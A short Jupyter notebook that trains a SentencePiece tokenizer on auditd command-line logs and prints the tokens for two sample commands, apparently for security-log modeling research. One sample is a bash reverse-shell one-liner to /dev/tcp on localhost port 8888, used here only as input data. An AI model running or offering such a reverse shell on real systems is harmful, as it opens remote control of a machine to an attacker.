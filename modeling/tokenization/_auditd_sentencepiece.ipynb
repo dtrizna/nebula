{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sentencepiece as spm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "spm.SentencePieceTrainer.Train(rf'''--input=auditd_total.cm --model_prefix=auditd --vocab_size=512 --model_type=bpe''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['▁/', 'usr', '/', 'bin', '/', 'bash', '▁-', 'i', '▁>&', '▁/', 'dev', '/', 'tcp', '/127.0.0.1/', '8888', '▁0', '>&1']\n",
      "[24, 30, 427, 15, 427, 43, 6, 435, 68, 24, 209, 427, 256, 276, 191, 163, 34]\n",
      "['▁/', 'bin', '/', 'bash', '▁/', 'var', '/', 'lib', '/', 'ambari', '-', 'ag', 'ent', '/', 'ambari', '-', 's', 'u', 'd', 'o', '.', 'sh', '▁s', 'u', '▁', 'ambari', '-', 'q', 'a', '▁-', 'l', '▁-', 's', '▁/', 'bin', '/', 'bash', '▁-', 'c', '▁export', '▁', 'PA', 'T', 'H', '=', '/', 'usr', '/', 'local', '/', 'sbin', ':/', 'usr', '/', 'local', '/', 'bin', ':/', 'usr', '/', 'sbin', ':/', 'usr', '/', 'bin', ':/', 'sbin', ':/', 'bin', ':/', 'usr', '/', 'game', 's', ':/', 'usr', '/', 'local', '/', 'game', 's', ':/', 's', 'n', 'ap', '/', 'bin', ':/', 'var', '/', 'lib', '/', 'ambari', '-', 'ag', 'ent', '▁', ';', '▁c', 'ur', 'l', '▁-', 's', '▁-', 'o', '▁/', 'dev', '/', 'n', 'ul', 'l', '▁-', 'w', \"'\", '%', '{', 'http', '_', 'co', 'de', '}', \"'\", '▁--', 'n', 'e', 'g', 'ot', 'i', 'at', 'e', '▁-', 'u', ':', '▁-', 'k', '▁', 'http', '://', 'hn', '1', '-', 'hdi', '_', 'NUMBER', '_', '.', 'q', '55', 'm', 'q', 'v', '1', 'n', 'm', 'l', '3', 'e', 'b', 'b', '0', 'r', '30', 'z', 'p', 'h', 'k', 'cl', 'w', 'c', '.', 'c', 'x', '.', 'internal', '.', 'cloudapp', '.', 'net', ':', '_', 'NUMBER', '_/', 's', 'es', 'si', 'on', 's', '▁|', '▁', 'g', 're', 'p', '▁_', 'NUMBER', '_']\n",
      "[24, 15, 427, 43, 24, 112, 427, 134, 427, 312, 443, 300, 137, 427, 312, 443, 426, 446, 447, 433, 425, 7, 157, 446, 424, 312, 443, 485, 438, 6, 452, 6, 426, 24, 15, 427, 43, 6, 441, 327, 424, 233, 483, 498, 466, 427, 30, 427, 149, 427, 262, 80, 30, 427, 149, 427, 15, 80, 30, 427, 262, 80, 30, 427, 15, 80, 262, 80, 15, 80, 30, 427, 420, 426, 80, 30, 427, 149, 427, 420, 426, 80, 426, 432, 71, 427, 15, 80, 112, 427, 134, 427, 312, 443, 300, 137, 424, 451, 344, 264, 452, 6, 426, 6, 433, 24, 209, 427, 432, 307, 452, 6, 471, 455, 508, 489, 310, 463, 280, 113, 490, 455, 131, 432, 428, 464, 226, 435, 62, 428, 6, 446, 479, 6, 459, 424, 310, 387, 423, 429, 443, 394, 463, 75, 463, 425, 485, 374, 453, 485, 467, 429, 432, 453, 452, 458, 428, 445, 445, 430, 434, 173, 478, 431, 440, 459, 93, 471, 441, 425, 441, 470, 425, 165, 425, 169, 425, 111, 479, 463, 75, 139, 426, 198, 205, 54, 426, 91, 424, 464, 92, 431, 343, 75, 463]\n"
     ]
    }
   ],
   "source": [
    "sp = spm.SentencePieceProcessor(model_file='auditd.model')\n",
    "s0 = \"/usr/bin/bash -i >& /dev/tcp/127.0.0.1/8888 0>&1\"\n",
    "s1 = \"/bin/bash /var/lib/ambari-agent/ambari-sudo.sh su ambari-qa -l -s /bin/bash -c export  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/var/lib/ambari-agent ; curl -s -o /dev/null -w'%{http_code}' --negotiate -u: -k http://hn1-hdi_NUMBER_.q55mqv1nml3ebb0r30zphkclwc.cx.internal.cloudapp.net:_NUMBER_/sessions | grep _NUMBER_ \"\n",
    "ss = [s0, s1]\n",
    "for s in ss:\n",
    "    print(sp.encode_as_pieces(s))\n",
    "    print(sp.encode_as_ids(s))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.13 64-bit (microsoft store)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "4e123ac7eba4d44924a894b1be2fc564282b1d2645e9d64ed33bc5003b6c2a87"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
